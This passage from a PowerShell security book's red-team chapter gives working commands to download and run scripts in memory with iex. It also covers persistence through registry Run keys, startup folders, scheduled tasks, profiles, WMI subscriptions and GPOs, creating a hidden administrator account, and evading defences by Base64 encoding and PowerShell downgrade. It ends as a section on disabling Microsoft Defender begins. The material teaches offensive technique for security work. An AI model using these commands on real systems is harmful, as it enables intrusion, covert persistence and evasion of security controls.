			<p>For this example, we will use the <strong class="source-inline">HelloWorld.ps1</strong> script from <span class="No-Break"><strong class="source-inline">Chapter01</strong></span><span class="No-Break">: </span><a href="https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/master/Chapter01/HelloWorld.ps1"><span class="No-Break">https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1</span></a><span class="No-Break">.</span></p>
			<p>You can use the following code snippet to achieve <span class="No-Break">your goal:</span></p>
			<pre class="source-code">
$Url = "https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1"
$HttpRequest = New-Object -ComObject Microsoft.XMLHTTP
$HttpRequest.open('GET', $Url, $false)
$HttpRequest.send()
iex $HttpRequest.responseText</pre>
			<p>You can also change the user agent of <span class="No-Break">your request:</span></p>
			<pre class="source-code">
$HttpRequest.SetRequestHeader("User-Agent", "1337")</pre>
			<p>Simply execute the preceding line before sending your request – of course, modify it first to reflect the user agent of <span class="No-Break">your choice.</span></p>
			<h3>Downloading and executing a file using .NET classes</h3>
			<p>You want to download<a id="_idIndexMarker1516"/> and execute a file<a id="_idIndexMarker1517"/> from the internet<a id="_idIndexMarker1518"/> using .<span class="No-Break">NET</span><span class="No-Break"><a id="_idIndexMarker1519"/></span><span class="No-Break"> classes.</span></p>
			<h4>Solution</h4>
			<p>There are multiple ways to download a file using <span class="No-Break">PowerShell cmdlets:</span></p>
			<ul>
				<li><span class="No-Break"><strong class="source-inline">System.Net.WebClient</strong></span></li>
			</ul>
			<p>To download a file using the <strong class="source-inline">System.Net.WebClient</strong> class, you can use the following <span class="No-Break">code snippet:</span></p>
			<pre class="source-code">
(New-Object System.Net.WebClient).DownloadFile(<strong class="bold">&lt;source&gt;</strong>, <strong class="bold">&lt;destination&gt;</strong>)</pre>
			<p>Make sure you replace <strong class="source-inline">&lt;source&gt;</strong> and <strong class="source-inline">&lt;destination&gt;</strong> appropriately with the source of the file and where it should be <span class="No-Break">downloaded, respectively.</span></p>
			<p>For this example, we will use the <strong class="source-inline">HelloWorld.ps1</strong> script from <span class="No-Break"><strong class="source-inline">Chapter01</strong></span><span class="No-Break">: </span><a href="https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/master/Chapter01/HelloWorld.ps1"><span class="No-Break">https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1</span></a><span class="No-Break">.</span></p>
			<p>The following example shows how the <strong class="source-inline">HelloWorld.ps1</strong> script is downloaded in the administrator’s <span class="No-Break"><strong class="source-inline">Downloads</strong></span><span class="No-Break"> folder:</span></p>
			<pre class="source-code">
<strong class="bold">&gt; $Url = "https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1"</strong>
<strong class="bold">&gt; $OutputFile = "C:\Users\Administrator\Downloads\HelloWorld.ps1"</strong>
<strong class="bold">&gt; (New-Object System.Net.WebClient).DownloadFile($Url, $OutputFile)</strong></pre>
			<p>If you want to execute<a id="_idIndexMarker1520"/> a file from the internet<a id="_idIndexMarker1521"/> without actually<a id="_idIndexMarker1522"/> saving it to a file, you can<a id="_idIndexMarker1523"/> also <span class="No-Break">leverage </span><span class="No-Break"><strong class="source-inline">DownloadString()</strong></span><span class="No-Break">:</span></p>
			<pre class="source-code">
&gt; iex((New-Object System.NET.WebClient).DownloadString(<strong class="bold">&lt;source&gt;</strong>))</pre>
			<p>We can use the following code to execute our script from the <span class="No-Break">GitHub repository:</span></p>
			<pre class="source-code">
<strong class="bold">&gt; $Url = "https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1"</strong>
<strong class="bold">&gt; iex((New-Object System.NET.WebClient).DownloadString($Url))</strong></pre>
			<p>Using this method, it is also possible to change the <span class="No-Break">user agent:</span></p>
			<pre class="source-code">
<strong class="bold">$Url = "https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1"</strong>
<strong class="bold">$WebClient = New-Object System.NET.WebClient</strong>
<strong class="bold">$WebClient.Headers.Add("user-agent", "1337")</strong>
<strong class="bold">iex(($WebClient).DownloadString($Url))</strong></pre>
			<p>Please note that the user agent needs to be set before <span class="No-Break"><em class="italic">every</em></span><span class="No-Break"> request.</span></p>
			<ul>
				<li><span class="No-Break"><strong class="source-inline">System.Xml.XmlDocument</strong></span></li>
			</ul>
			<p>You can also load an XML document and execute specific nodes. This is particularly useful if the commands in the nodes <span class="No-Break">are encoded.</span></p>
			<p>In this example, we will use an XML file, which you can find in this book’s GitHub <span class="No-Break">repository: </span><a href="https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/master/Chapter08/XmlDocument-Demo.xml"><span class="No-Break">https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter08/XmlDocument-Demo.xml</span></a><span class="No-Break">.</span></p>
			<p>First, we must<a id="_idIndexMarker1524"/> load<a id="_idIndexMarker1525"/> the URL<a id="_idIndexMarker1526"/> of the XML file<a id="_idIndexMarker1527"/> in the <strong class="source-inline">$</strong><span class="No-Break"><strong class="source-inline">Xml</strong></span><span class="No-Break"> variable:</span></p>
			<pre class="source-code">
<strong class="bold">&gt; $Url = "https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter08/XmlDocument-Demo.xml"</strong>
<strong class="bold">&gt; $Xml = New-Object System.Xml.XmlDocument</strong>
<strong class="bold">&gt; $Xml.Load($Url)</strong></pre>
			<p>Once the XML object is available, you can easily access the nodes and execute commands that were saved in the <span class="No-Break">XML file:</span></p>
			<pre class="source-code">
<strong class="bold">&gt; $Xml.xml.node1.HelloWorld | iex</strong>
<strong class="bold">&gt; $Xml.xml.othernode | iex</strong></pre>
			<ul>
				<li><span class="No-Break"><strong class="source-inline">System.NET.WebRequest</strong></span></li>
			</ul>
			<p>The best method for downloading and executing a script in memory only is by using the <span class="No-Break"><strong class="source-inline">System.NET.WebRequest</strong></span><span class="No-Break"> class.</span></p>
			<p>For this example, we will use the <strong class="source-inline">HelloWorld.ps1</strong> script from <span class="No-Break"><strong class="source-inline">Chapter01</strong></span><span class="No-Break">: </span><a href="https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/master/Chapter01/HelloWorld.ps1"><span class="No-Break">https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1</span></a><span class="No-Break">.</span></p>
			<p>The following code snippet demonstrates how to create a web request to get the content of the <strong class="source-inline">HelloWorld.ps1</strong> script and execute it <span class="No-Break">in memory:</span></p>
			<pre class="source-code">
<strong class="bold">&gt; $Url = "https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1"</strong>
<strong class="bold">&gt; $WebRequest = [System.NET.WebRequest]::Create($Url)</strong>
<strong class="bold">&gt; $Response = $WebRequest.GetResponse()</strong>
<strong class="bold">&gt; iex ([System.IO.StreamReader]($Response.GetResponseStream())).ReadToEnd()</strong></pre>
			<p>By creating and sending<a id="_idIndexMarker1528"/> a web<a id="_idIndexMarker1529"/> request, it is also possible<a id="_idIndexMarker1530"/> to set a custom<a id="_idIndexMarker1531"/> <span class="No-Break">user agent:</span></p>
			<pre class="source-code">
<strong class="bold">&gt; $Url = "https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1"</strong>
<strong class="bold">&gt; $webRequest = [System.NET.WebRequest]::Create($Url)</strong>
<strong class="bold">&gt; $webRequest.UserAgent = "1337"</strong>
<strong class="bold">&gt; $Response = $WebRequest.GetResponse()</strong>
<strong class="bold">&gt; iex ([System.IO.StreamReader]($Response.GetResponseStream())).ReadToEnd()</strong></pre>
			<h3>Executing C# code from PowerShell</h3>
			<p>You want to execute <a id="_idIndexMarker1532"/>your custom C# code <span class="No-Break">from PowerShell.</span></p>
			<h4>Solution</h4>
			<p>There are various ways to execute C# code from PowerShell. One of them is by using the <strong class="source-inline">Add-Type</strong> cmdlet to load and run your own .NET <span class="No-Break">Framework classes:</span></p>
			<pre class="source-code">
$source = @"
using System;
public class SayHello
{
    public static void Main()
    {
        Console.WriteLine("Hello World!");
    }
}
"@
Add-Type -TypeDefinition $source -Language CSharp
[SayHello]::Main()</pre>
			<p>In this example, first, I have defined a little C# code snippet in the <strong class="source-inline">$Source</strong> variable. By using <strong class="source-inline">Add-Type</strong>, the C# class is loaded into memory. Now, we can directly access the C# function using PowerShell without the need to ever compile the C# code. By executing <strong class="source-inline">[SayHello]::Main()</strong>, the <strong class="source-inline">Hello World!</strong> string will be written to <span class="No-Break">the output.</span></p>
			<p>There are also other<a id="_idIndexMarker1533"/> ways to execute C# code from PowerShell. Please refer to <a href="B16679_06_Final_PD.xhtml#_idTextAnchor150"><span class="No-Break"><em class="italic">Chapter 6</em></span></a>, <em class="italic">Active Directory – Attacks and Mitigation</em>, for <span class="No-Break">more</span><span class="No-Break"><a id="_idIndexMarker1534"/></span><span class="No-Break"> information.</span></p>
			<h2 id="_idParaDest-208"><a id="_idTextAnchor218"/>Persistence</h2>
			<p>Once a system<a id="_idIndexMarker1535"/> has been successfully compromised, adversaries want to establish<a id="_idIndexMarker1536"/> persistence so that their malicious code will be automatically executed so that they don’t lose control over the system. Various methods can be used to establish persistence. We will look at some of them in the <span class="No-Break">following sections.</span></p>
			<h3>Establishing persistence using the registry</h3>
			<p>You want to ensure<a id="_idIndexMarker1537"/> that your PowerShell code is automatically<a id="_idIndexMarker1538"/> executed on startup and want to use the registry for <span class="No-Break">this purpose.</span></p>
			<h4>Solution</h4>
			<p>You can achieve this by creating a registry key in the <strong class="source-inline">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</strong> <span class="No-Break">registry path:</span></p>
			<pre class="source-code">
&gt; New-ItemProperty -Path "<strong class="bold">&lt;registry path&gt;</strong>" -Name "<strong class="bold">&lt;name&gt;</strong>" -PropertyType String -Value "<strong class="bold">&lt;powershell command&gt;</strong>"</pre>
			<p>This example shows how a registry key can be created to run the <strong class="source-inline">C:\windows\system32\HelloWorld.ps1</strong> script while using PowerShell as an <span class="No-Break">autorun script:</span></p>
			<pre class="source-code">
&gt; New-ItemProperty -Path "REGISTRY::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "NotSuspiciousAtAll" -PropertyType String -Value "powershell.exe -NonInteractive -WindowStyle Hidden -Execution-Policy ByPass -File 'C:\windows\system32\HelloWorld.ps1'"</pre>
			<p>The command is stored under <strong class="source-inline">NotSuspiciousAtAll</strong>; whenever autostart is triggered, the script is executed using PowerShell in a noninteractive and hidden command line that is configured to bypass the <span class="No-Break">execution policy.</span></p>
			<h3>Establishing persistence using the startup folder</h3>
			<p>You want to establish<a id="_idIndexMarker1539"/> persistence by using the startup folder. Using<a id="_idIndexMarker1540"/> this method, it is simple to establish persistence but also simple to <span class="No-Break">detect it.</span></p>
			<h4>Solution</h4>
			<p>You can add your script to one of the following <span class="No-Break">startup folders:</span></p>
			<ul>
				<li><strong class="source-inline">$</strong><span class="No-Break"><strong class="source-inline">env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup</strong></span></li>
				<li><strong class="source-inline">$</strong><span class="No-Break"><strong class="source-inline">env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup</strong></span></li>
				<li><strong class="source-inline">$</strong><span class="No-Break"><strong class="source-inline">env:ALLUSERSPROFILE\Microsoft\Windows\Start Menu\Programs\StartUp</strong></span></li>
			</ul>
			<p>You can download it directly into the startup folder, as <span class="No-Break">shown here:</span></p>
			<pre class="source-code">
$path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
if( -Not (Test-Path -Path $path )) {
        New-Item -ItemType directory -Path $path
}
iwr -Uri "https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-Cybersecurity/master/Chapter01/HelloWorld.ps1" -OutFile "$path\HelloWorld.ps1"</pre>
			<p>Alternatively, you can create<a id="_idIndexMarker1541"/> a new file and fill<a id="_idIndexMarker1542"/> it <span class="No-Break">with content:</span></p>
			<pre class="source-code">
$path = "$env:PROGRAMDATA\Microsoft\Windows\Start Menu\Programs\Startup\HelloWorld.ps1"
New-Item -Path $path -ItemType File
Add-Content -Path $path -Value "Write-Host 'Hello World!'"</pre>
			<h3>Establishing persistence using scheduled tasks</h3>
			<p>You want to establish<a id="_idIndexMarker1543"/> persistence using <span class="No-Break">scheduled</span><span class="No-Break"><a id="_idIndexMarker1544"/></span><span class="No-Break"> tasks.</span></p>
			<h4>Solution</h4>
			<p>You can use <strong class="source-inline">schtasks</strong> to create a <span class="No-Break">scheduled task:</span></p>
			<pre class="source-code">
&gt; schtasks /create /tn "NotSuspiciousAtAll" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\windows\system32\HelloWorld.ps1" /sc onstart</pre>
			<p>The <strong class="source-inline">/create</strong> parameter indicates that you want to create a new scheduled task. Using <strong class="source-inline">/tn</strong>, you can specify the task name. Red teamers and adversaries usually try to pick a name that does not raise suspicion and that would easily be overlooked by a blue teamer if they were to investigate it. Using <strong class="source-inline">/tr</strong>, you can specify which command should be executed when this scheduled<a id="_idIndexMarker1545"/> task is being run; <strong class="source-inline">/sc</strong> defines when the task is being executed. In this case, the task<a id="_idIndexMarker1546"/> is scheduled every time the system <span class="No-Break">starts up.</span></p>
			<h3>Establishing persistence using the PowerShell profile</h3>
			<p>You want to establish persistence<a id="_idIndexMarker1547"/> using the PowerShell profile. This method<a id="_idIndexMarker1548"/> is harder to detect but your script will not run if <strong class="source-inline">-noprofile</strong> is specified whenever PowerShell starts, but using this method also means that it doesn’t trigger until the user runs PowerShell – which might never happen in <span class="No-Break">many cases.</span></p>
			<h4>Solution</h4>
			<p>PowerShell supports per-user profiles, which means each user has their own profile that will be loaded once they initiate a PowerShell session. These profiles are usually stored <span class="No-Break">under </span><span class="No-Break">C:\Users\&lt;USERNAME&gt;\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1</span><span class="No-Break">.</span></p>
			<p>If you were to add content to the current user profile, you could use <strong class="source-inline">-Path $Profile</strong> and add either your script or <span class="No-Break">your command:</span></p>
			<ul>
				<li>Add a script to the <span class="No-Break">current profile:</span><pre class="source-code">
<strong class="bold">Add-Content -Path $Profile -Value "C:\path\to\script.ps1"</strong></pre></li>
				<li>Add a command to execute the <span class="No-Break">current profile:</span><pre class="source-code">
<strong class="bold">Add-Content -Path $Profile -Value "Invoke-Command ..."</strong></pre></li>
			</ul>
			<p>To add your payload to every user profile on the current host, you could also iterate through all user profiles and add your script <span class="No-Break">or command:</span></p>
			<pre class="source-code">
$profiles = Get-ChildItem -Path "C:\Users" -Filter "Profile.ps1" -Recurse
foreach ($profile in $profiles) {
    Add-Content -Path $profile.FullName -Value "C:\windows\system32\HelloWorld.ps1"
}</pre>
			<p>In this example, first, we’ll look for all PowerShell user profiles in the <strong class="source-inline">C:\User</strong> folder to iterate through them and add the <strong class="source-inline">HelloWorld.ps1</strong> script, which is located <span class="No-Break">under </span><span class="No-Break"><strong class="source-inline">C:\windows\system32\</strong></span><span class="No-Break">.</span></p>
			<p>Additionally, there is also a global profile that applies to all users on the system, which is located under <strong class="source-inline">$PSHOME\Profile.ps1</strong>. <strong class="source-inline">$PSHOME</strong> is an automatic variable that contains the path to the directory where PowerShell <span class="No-Break">is installed:</span></p>
			<pre class="source-code">
&gt; Add-Content -Path "$PSHOME\Profile.ps1" -Value "C:\path\to\script.ps1"</pre>
			<p>This command will edit the global profile and add your script to it to be executed whenever a PowerShell session on this host <span class="No-Break">is initiated.</span></p>
			<p>There are several other profiles, depending<a id="_idIndexMarker1549"/> on the system or scenario. You can<a id="_idIndexMarker1550"/> find more information on profiles<a id="_idIndexMarker1551"/> in the official <span class="No-Break">documentation: </span><span class="No-Break">https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles</span><span class="No-Break">.</span></p>
			<h3>Establishing persistence using WMI</h3>
			<p>You want to establish<a id="_idIndexMarker1552"/> persistence by using WMI. This is one of the most<a id="_idIndexMarker1553"/> covert methods and is also provided as a feature <span class="No-Break">in PowerSploit.</span></p>
			<h4>Solution</h4>
			<p>To establish persistence using WMI, you could register a permanent event filter and consumer that will run on a system periodically unless they are unregistered. This section will show you how this can <span class="No-Break">be achieved.</span></p>
			<p>First, create a WMI event filter that specifies the events that need to occur to trigger the script <span class="No-Break">to run:</span></p>
			<pre class="source-code">
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{name='WMIPersistenceFilter';EventNameSpace='root\CimV2';QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 07 AND TargetInstance.Minute = 00 GROUP WITHIN 60"};</pre>
			<p>In this example, the <strong class="source-inline">WMIPersistenceFilter</strong> event filter has been created. To create persistence, it is useful to use an event that is guaranteed to occur regularly. Therefore, in this example, the event will be triggered whenever the system time <span class="No-Break">is </span><span class="No-Break"><em class="italic">07:00</em></span><span class="No-Break">.</span></p>
			<p>Next, create a WMI command-line<a id="_idIndexMarker1554"/> event consumer. This command<a id="_idIndexMarker1555"/> is meant to be executed whenever the event filter <span class="No-Break">returns data:</span></p>
			<pre class="source-code">
$consumer = Set-WmiInstance -Namespace "root\subscription" -Class 'CommandLineEventConsumer' -Arguments @{ name='WMIPersistenceConsumer';CommandLineTemplate="$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -File C:\windows\system32\HelloWorld.ps1";RunInteractively='false'};</pre>
			<p>In our example, the consumer is called <strong class="source-inline">WMIPersistenceConsumer</strong> and it is configured to bypass the execution policy and run the <span class="No-Break"><strong class="source-inline">C:\windows\system32\HelloWorld.ps1</strong></span><span class="No-Break"> script.</span></p>
			<p>Last, but not least, we need to <em class="italic">bind</em> them both together – that is, the filter and <span class="No-Break">the consumer:</span></p>
			<pre class="source-code">
Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$filter;Consumer=$consumer}</pre>
			<p>Now that the binding<a id="_idIndexMarker1556"/> has been created, the PowerShell script will be executed<a id="_idIndexMarker1557"/> every day at <span class="No-Break">7:00 A.M.</span></p>
			<h3>Establishing persistence using Group Policy Objects</h3>
			<p>You compromised the DC<a id="_idIndexMarker1558"/> and want to establish persistence using <strong class="bold">Group Policy Objects</strong> (<strong class="bold">GPOs</strong>). This has the advantage<a id="_idIndexMarker1559"/> that GPOs are applied over and over again on all configured systems. If the GPO is not removed or altered, your payload will always be run on thousands <span class="No-Break">of systems.</span></p>
			<h4>Solution</h4>
			<p>You need to create a new GPO that runs your PowerShell<a id="_idIndexMarker1560"/> script or command on startup. This can be done using the <strong class="bold">Group Policy Management Console</strong> (<strong class="bold">GPMC</strong>) or PowerShell. In this example, we are using PowerShell to create <span class="No-Break">the GPO:</span></p>
			<pre class="source-code">
$gpo = New-GPO -Name "PersistentScript"
Set-GPRegistryValue -Name "PersistentScript" -Key "HKLM\Software\Policies\Microsoft\Windows\CurrentVersion\Run" -ValueName "PersistentScript" -Type String -Value "powershell.exe -ExecutionPolicy Bypass -File \\Dc01\sysvol\PSSec.local\scripts\HelloWorld.ps1"</pre>
			<p>In this example, we create a GPO named <strong class="source-inline">PersistentScript</strong>. Next, we add a Group Policy registry value in the startup folder and configure it to run our script via PowerShell (using the <strong class="source-inline">ExecutionPolicy Bypass</strong> parameter) every time the system starts. By doing so, the script will run on every system the Group Policy applies to at startup, regardless of how the execution policy <span class="No-Break">is configured.</span></p>
			<p>Finally, the newly created GPO only needs to be applied to one or more target systems. This can be done using the <span class="No-Break"><strong class="source-inline">New-GPLink</strong></span><span class="No-Break"> cmdlet:</span></p>
			<pre class="source-code">
&gt; New-GPLink -Name "PersistentScript" -Target "DC=domain,DC=local"</pre>
			<p>Modifying an existing GPO is also an option that attackers are likely to use if the permissions are not restrictive enough. While a newly created GPO might raise suspicion, modifying an existing GPO might fall under the radar of the <span class="No-Break">blue team:</span></p>
			<pre class="source-code">
$gpo = Get-GPO -Name "PersistentScript"
Set-GPRegistryValue -Name "PersistentScript" -Key "HKLM\Software\Policies\Microsoft\Windows\CurrentVersion\Run" -ValueName "PersistentScript" -Type String -Value "powershell.exe -ExecutionPolicy Bypass -File \\Dc01\sysvol\PSSec.local\scripts\HelloWorld-Modified.ps1"</pre>
			<p>Note that using GPOs<a id="_idIndexMarker1561"/> as a method to establish persistence <a id="_idIndexMarker1562"/>only works if you have the <span class="No-Break">appropriate privileges.</span></p>
			<h3>Creating a new user account and adding it to a group</h3>
			<p>You want to create<a id="_idIndexMarker1563"/> a new user account<a id="_idIndexMarker1564"/> and add it to <span class="No-Break">a group.</span></p>
			<h4>Solution</h4>
			<p>There are multiple<a id="_idIndexMarker1565"/> ways to achieve<a id="_idIndexMarker1566"/> your goal. You can, for example, use <strong class="source-inline">New-LocalUser</strong> in combination with <strong class="source-inline">Add-LocalGroupMember</strong> to create a new user and add it to an <span class="No-Break">existing group:</span></p>
			<pre class="source-code">
&gt; $pass = ConvertTo-SecureString "Hacked!123" -AsPlainText -Force
&gt; New-LocalUser -Name hacker -Password $pass
&gt; Add-LocalGroupMember -Group Administrators -Member hacker</pre>
			<p>Alternatively, you can use <strong class="source-inline">net.exe</strong> <span class="No-Break">to succeed:</span></p>
			<pre class="source-code">
&gt; net user hacker Hacked!123 /add /Y
&gt; net localgroup administrators hacker /add</pre>
			<h2 id="_idParaDest-209"><a id="_idTextAnchor219"/>Defense evasion</h2>
			<p>Usually, red teamers<a id="_idIndexMarker1567"/> want to avoid being detected and try to hide and obfuscate<a id="_idIndexMarker1568"/> their tracks as much as possible. This phase is known as <span class="No-Break"><strong class="bold">defense evasion</strong></span><span class="No-Break">.</span></p>
			<h3>Avoiding creating a window on the desktop</h3>
			<p>You want to avoid creating<a id="_idIndexMarker1569"/> PowerShell windows on the user’s desktop<a id="_idIndexMarker1570"/> when executing PowerShell commands <span class="No-Break">and scripts.</span></p>
			<h4>Solution</h4>
			<p>You can achieve this by using <strong class="source-inline">-w hidden</strong> to determine <strong class="source-inline">WindowStyle</strong>, which is short <span class="No-Break">for </span><span class="No-Break"><strong class="source-inline">-WindowStyle</strong></span><span class="No-Break">:</span></p>
			<pre class="source-code">
&gt; powershell.exe -w hidden -c &lt;command&gt;
&gt; powershell.exe -WindowStyle hidden -c &lt;command&gt;</pre>
			<h3>Executing a Base64-encoded command using powershell.exe</h3>
			<p>You want to supply<a id="_idIndexMarker1571"/> a Base64-encoded command<a id="_idIndexMarker1572"/> as a <span class="No-Break">command-line argument.</span></p>
			<h4>Solution</h4>
			<p>A Base64-encoded string can be executed in PowerShell using the <span class="No-Break">following syntax:</span></p>
			<pre class="source-code">
&gt; powershell.exe -e "<strong class="bold">&lt;Base64 string&gt;</strong>"</pre>
			<p>The <strong class="source-inline">-e</strong> parameter (short for <strong class="source-inline">-EncodedCommand</strong>) allows you to supply a Base64-encoded command directly as a <span class="No-Break">command-line argument.</span></p>
			<p>Just replace <strong class="source-inline">&lt;Base64 string&gt;</strong> with your Base64-encoded command, as shown in the <span class="No-Break">following example:</span></p>
			<pre class="source-code">
&gt; powershell.exe -e "VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACAAVwBvAHIAbABkACEAJwA="</pre>
			<p>In this example, the Base64-encoded<a id="_idIndexMarker1573"/> string would be executed in PowerShell, and <strong class="source-inline">“Hello World!”</strong> would be written to the command line. This is because<a id="_idIndexMarker1574"/> this Base64 string translates to <strong class="source-inline">"Write-Host '</strong><span class="No-Break"><strong class="source-inline">Hello World!'"</strong></span><span class="No-Break">.</span></p>
			<h3>Converting a string into a Base64 string</h3>
			<p>You want to convert a string<a id="_idIndexMarker1575"/> into a Base64 string<a id="_idIndexMarker1576"/> to obfuscate <span class="No-Break">your commands.</span></p>
			<h4>Solution</h4>
			<p>You can convert a string into a Base64 string by using the following code snippet; just replace <strong class="source-inline">&lt;text&gt;</strong> with the string that you want <span class="No-Break">to convert:</span></p>
			<pre class="source-code">
&gt; [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("<strong class="bold">&lt;text&gt;</strong>"))</pre>
			<p>The following example would convert the <strong class="source-inline">"Write-Host 'Hello World!'"</strong> string into a <span class="No-Break">Base64 string:</span></p>
			<pre class="source-code">
&gt; [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Write-Host 'Hello World!'"))</pre>
			<p>In the preceding example, we converted a Unicode string into a Base64 string. It is also possible to convert an <span class="No-Break">ASCII string:</span></p>
			<pre class="source-code">
&gt; [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("Write-Host 'Hello World!'"))</pre>
			<h3>Converting a Base64 string into a human-readable string</h3>
			<p>You want to convert a Base64 string back<a id="_idIndexMarker1577"/> into a <span class="No-Break">human-readable</span><span class="No-Break"><a id="_idIndexMarker1578"/></span><span class="No-Break"> format.</span></p>
			<h4>Solution</h4>
			<p>You can use the following code snippet to convert a Base64 string back into a human-readable string. Replace <strong class="source-inline">"&lt;Base64 string&gt;"</strong> with the actual <span class="No-Break">Base64 string:</span></p>
			<pre class="source-code">
&gt; [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("<strong class="bold">&lt;Base64 string&gt;</strong>"))</pre>
			<p>The following example demonstrates how <span class="No-Break">the </span><span class="No-Break"><strong class="source-inline">"VwByAGkAdABlAC0ASABvAHMAdAAgACc</strong></span><strong class="source-inline">
ASABlAGwAbABvACAAVwBvAHIAbABkACEAJwA="</strong> string would be translated back into a <span class="No-Break">human-readable format:</span></p>
			<pre class="source-code">
&gt; [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACAAVwBv AHIAbABkACEAJwA="))</pre>
			<p>This would result in the <strong class="source-inline">"Write-Host 'Hello </strong><span class="No-Break"><strong class="source-inline">World!'"</strong></span><span class="No-Break"> string.</span></p>
			<p>Often, an ASCII string is encoded into a Base64 string. If you were to use Unicode to decode the string, you would not receive the desired output, as shown in the <span class="No-Break">following screenshot:</span></p>
			<div>
				<div class="IMG---Figure" id="_idContainer193">
					<img alt="Figure 8.2 – If you are not using the correct format, you will get a corrupted output" src="image/B16679_08_002.jpg"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 8.2 – If you are not using the correct format, you will get a corrupted output</p>
			<p>Use the following command<a id="_idIndexMarker1579"/> to convert a Base64 string<a id="_idIndexMarker1580"/> back into an <span class="No-Break">ASCII string:</span></p>
			<pre class="source-code">
&gt; [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("V3JpdGUtSG9zdCAnSGVsbG8gV29ybGQhJw=="))</pre>
			<p>This would also result in the <strong class="source-inline">"Write-Host 'Hello </strong><span class="No-Break"><strong class="source-inline">World!'"</strong></span><span class="No-Break"> string.</span></p>
			<h3>Performing a downgrade attack</h3>
			<p>You want to bypass security<a id="_idIndexMarker1581"/> mechanisms such as event<a id="_idIndexMarker1582"/> logging that were introduced with newer PowerShell versions and therefore want to run a <span class="No-Break">downgrade attack.</span></p>
			<h4>Solution</h4>
			<p>A downgrade attack can be executed by specifying PowerShell’s version number when <span class="No-Break">running </span><span class="No-Break"><strong class="source-inline">powershell.exe</strong></span><span class="No-Break">:</span></p>
			<pre class="source-code">
&gt; powershell.exe -version 2 –command &lt;command&gt;</pre>
			<p>If the specified version is installed, the command will run while using the deprecated binary, which implies that only security features that were already introduced to this version <span class="No-Break">are applied.</span></p>
			<p>If you try to run <strong class="source-inline">powershell.exe -version 2</strong> and you get an error message similar to the one shown in the following code snippet, stating that version 2 of .NET Framework is missing, that means that .NET Framework 2.0 hasn’t been installed on the <span class="No-Break">system yet:</span></p>
			<pre class="source-code">
&gt; powershell.exe -version 2
Version v2.0.50727 of the .NET Framework is not installed and it is required to run version 2 of Windows PowerShell.</pre>
			<p>.NET Framework 2.0 can be installed manually. To evaluate whether PowerShell version 2 is enabled or disabled, run the <span class="No-Break">following command:</span></p>
			<pre class="source-code">
&gt; Get-WindowsOptionalFeature -Online | Where-Object {$_.FeatureName -match "PowerShellv2"}
FeatureName : MicrosoftWindowsPowerShellV2Root
State       : Enabled
FeatureName : MicrosoftWindowsPowerShellV2
State       : Enabled</pre>
			<p>In this example, it seems like PowerShell version 2 is still enabled on this machine. So, if the missing .NET Framework 2.0 were<a id="_idIndexMarker1583"/> to be installed, this system would be vulnerable<a id="_idIndexMarker1584"/> to a <span class="No-Break">downgrade attack.</span></p>
			<h3>Disabling Microsoft Defender</h3>
			<p>You want to disable<a id="_idIndexMarker1585"/> Microsoft Defender<a id="_idIndexMarker1586"/> and most of its <span class="No-Break">security features.</span></p>
			<h4>Solution</h4>
			<p>You can use <strong class="source-inline">Set-MpPreference</strong> to achieve <span class="No-Break">your goal:</span></p>
			<pre class="source-code">
